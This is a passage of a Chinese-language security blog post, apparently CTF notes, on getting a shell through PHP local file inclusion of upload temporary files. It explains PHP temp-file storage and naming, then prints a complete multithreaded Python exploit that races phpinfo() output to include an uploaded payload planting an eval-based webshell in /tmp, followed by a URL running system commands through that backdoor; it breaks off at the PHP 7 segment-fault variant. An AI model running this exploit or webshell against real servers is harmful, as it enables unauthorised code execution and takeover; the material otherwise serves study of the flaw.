+<li><strong>条件竞争包含</strong>：多线程尝试包含FD文件，使用随机路径绕过限制</li>
+<li><strong>执行Payload</strong>：成功包含临时文件中的PHP代码，执行系统命令</li>
+</ol>
+<h2 id="php-lfi利用临时文件getshell-姿势"><a class="markdownIt-Anchor" href="#php-lfi利用临时文件getshell-姿势"></a> PHP LFI利用临时文件Getshell 姿势</h2>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106498971">PHP LFI 利用临时文件 Getshell 姿势_phpinfo拿shell-CSDN博客</a></p>
+<p>最近遇到太多这种类型了，来总结看看</p>
+<p><strong>使用场景：</strong></p>
+<p>在文件包含题目中，通常是需要包含含有我们的恶意代码的文件才能够进行利用，但<strong>假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件了。</strong></p>
+<p>目前，常见的两种临时文件包含漏洞利用方法主要是：<strong><code>PHPINFO()</code> and <code>PHP7 Segment Fault</code></strong>，利用这两种奇技淫巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。</p>
+<h3 id="临时文件机制"><a class="markdownIt-Anchor" href="#临时文件机制"></a> 临时文件机制</h3>
+<h4 id="全局变量"><a class="markdownIt-Anchor" href="#全局变量"></a> 全局变量</h4>
+<p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量<code>$_FILES</code>里。</p>
+<p><code>$_FILES</code>超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件的原名称。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如<span class="string">&quot;image/gif&quot;</span>。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 已上传文件的大小，单位为字节。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] 该文件上传的错误代码，上传成功其值为<span class="number">0</span>，否则为错误信息。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端存储的临时文件名</span><br></pre></td></tr></table></figure>
+<p>在临时文件包含漏洞中<code>$_FILES['userfile']['name']</code>这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p>
+<h4 id="存储目录"><a class="markdownIt-Anchor" href="#存储目录"></a> 存储目录</h4>
+<p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由<strong>php.ini</strong>的**<code>upload_tmp_dir</code>**属性指定，假如<code>upload_tmp_dir</code>的路径不可写，PHP会上传到系统默认的临时目录中。</p>
+<p>不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。</p>
+<p><strong>Linux目录</strong></p>
+<p>Linxu系统服务的临时文件主要存储在根目录的tmp文件夹下，具有一定的开放权限。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/</span><br></pre></td></tr></table></figure>
+<p><img src="../images/t017a698e2084ab0011.png" alt="img" /></p>
+<p><strong>windows目录</strong></p>
+<p>Windows系统服务的临时文件主要存储在系统盘Windows文件夹下，具有一定的开放权限。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">C</span>:<span class="regexp">/Windows/</span></span><br><span class="line"><span class="attr">C</span>:<span class="regexp">/Windows/</span><span class="title class_">Temp</span>/</span><br></pre></td></tr></table></figure>
+<h4 id="命名规则"><a class="markdownIt-Anchor" href="#命名规则"></a> 命名规则</h4>
+<p>存储在服务器上的<strong>临时文件的文件名都是随机生成的</strong>，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。</p>
+<p>可以通过phpinfo来查看临时文件的信息。</p>
+<p><strong>Linux Temporary File</strong></p>
+<p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php+[6个随机字符]</code>）</p>
+<p><img src="../images/t018d1d61d49d5af756.png" alt="img" /></p>
+<p><strong>Windows Temporary File</strong></p>
+<p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php+[4个随机字符].tmp</code>）</p>
+<p><img src="../images/t01b4d0f072cf1b60e9.png" alt="img" /></p>
+<h3 id="phpinfo特性"><a class="markdownIt-Anchor" href="#phpinfo特性"></a> PHPINFO特性</h3>
+<p>通过上面的介绍，服务器上存储的临时文件名是随机的，这就很难获取其真实的文件名。不过，<strong>如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</strong></p>
+<h4 id="测试代码"><a class="markdownIt-Anchor" href="#测试代码"></a> 测试代码</h4>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>phpinfo.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h4>
+<p>当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p>
+<p>利用phpinfo的特性可以很好的帮助我们，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，拿到临时文件变量名之后，就可以进行包含执行我们传入的恶意代码。</p>
+<h4 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h4>
+<p><strong>利用条件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无   PHPINFO的这种特性源于php自身，与php的版本无关</span><br></pre></td></tr></table></figure>
+<p><strong>测试脚本</strong></p>
+<p>编写脚本，上传文件探测是否存在phpinfo包含临时文件的信息。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: (<span class="string">&quot;aa.txt&quot;</span>,<span class="string">&quot;ssss&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://x.x.x.x/phpinfo.php&quot;</span></span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<p>运行脚本向服务器发出请求可以看到回显中有如下内容</p>
+<p><strong>Linux</strong></p>
+<p><img src="../images/t018d1d61d49d5af756-17666679298537.png" alt="img" /></p>
+<p><strong>Windows</strong></p>
+<p><img src="../images/t01b4d0f072cf1b60e9-176666796152310.png" alt="img" /></p>
+<p><strong>利用原理</strong></p>
+<p>验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。</p>
+<p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
+<p><strong>利用过程</strong></p>
+<p>这个时候就需要用到<strong>条件竞争</strong>，具体原理和过程如下：</p>
+<p>（1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p>
+<p>（2）因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</p>
+<p>（3）php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p>
+<p>（4）所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p>
+<p>（5）此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p>
+<p>（6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p>
+<p>（参考ph牛：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/php/inclusion%EF%BC%89">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a> ）</p>
+<p><strong>Getshell</strong></p>
+<p>利用ph牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如上传的恶意文件内容、phpinfo.php和index.php相应文件的文件名和位置、系统临时文件写入目录等</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">exp.py</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#python version 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>(<span class="params">host, port</span>):</span><br><span class="line">    TAG = <span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD = <span class="string">&quot;&quot;&quot;%sr</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/Qftm&#x27;, &#x27;&lt;?php eval($_REQUEST[Qftm])?&gt;&#x27;)?&gt;r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">    <span class="comment"># PAYLOAD = &quot;&quot;&quot;%sr</span></span><br><span class="line">    <span class="comment"># &lt;?php file_put_contents(&#x27;/var/www/html/Qftm.php&#x27;, &#x27;&lt;?php eval($_REQUEST[Qftm])?&gt;&#x27;)?&gt;r&quot;&quot;&quot; % TAG</span></span><br><span class="line">    REQ1_DATA = <span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;r</span></span><br><span class="line"><span class="string">Content-Type: text/plainr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding = <span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1 = <span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot; HTTP/1.1r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Length: %sr</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> % (<span class="built_in">len</span>(REQ1_DATA), host, REQ1_DATA)</span><br><span class="line">    <span class="comment"># modify this to suit the LFI script</span></span><br><span class="line">    LFIREQ = <span class="string">&quot;&quot;&quot;GET /index.php?file=%s HTTP/1.1r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        fn = d[i + <span class="number">17</span>:i + <span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span><br><span class="line">        threading.Thread.__init__(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="variable language_">self</span>.event = e</span><br><span class="line">        <span class="variable language_">self</span>.lock = l</span><br><span class="line">        <span class="variable language_">self</span>.maxattempts = m</span><br><span class="line">        <span class="variable language_">self</span>.args = args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= <span class="variable language_">self</span>.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*<span class="variable language_">self</span>.args)</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;nGot it! Shell created in /tmp/Qftm.php&quot;</span></span><br><span class="line">                    <span class="variable language_">self</span>.event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d += i</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&quot;0rnrn&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i + <span class="number">10</span>], i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i + <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port = <span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz = <span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write(<span class="string">&quot;r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Woot!  m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p><strong>运行脚本Getshell</strong></p>
+<p>修改脚本之后，运行即可包含生成我们精心设置好的/tmp/Qftm后门文件</p>
+<p><img src="../images/t0189c0caa43809494a.png" alt="img" /></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.33</span>.<span class="number">6.145</span>/index.php?file=<span class="regexp">/tmp/</span>Qftm&amp;Qftm=<span class="keyword">system</span>(<span class="variable">%2</span>7ls<span class="variable">%20</span>/tmp/<span class="variable">%27</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/t0158deff2e174028b8.png" alt="img" /></p>
+<h3 id="php7-segment-fault"><a class="markdownIt-Anchor" href="#php7-segment-fault"></a> php7 Segment Fault</h3>
+<h4 id="利用条件-2"><a class="markdownIt-Anchor" href="#利用条件-2"></a> 利用条件</h4>
+<p><strong>利用条件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7.0.0 &lt;= PHP Version &lt; 7.0.28</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞分析-2"><a class="markdownIt-Anchor" href="#漏洞分析-2"></a> 漏洞分析</h4>
+<p>在上面包含姿势中提到的包含临时文件，需要知道phpinfo同时还需条件竞争，但如果没有phpinfo的存在，我们就很难利用上述方法去getshell。</p>
+<p>那么<strong>如果目标不存在phpinfo</strong>，应该如何处理呢？这里可以<strong>用<code>php7 segment fault</code>特性（<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=75535">CVE-2018-14884</a>）进行Bypass</strong>。</p>
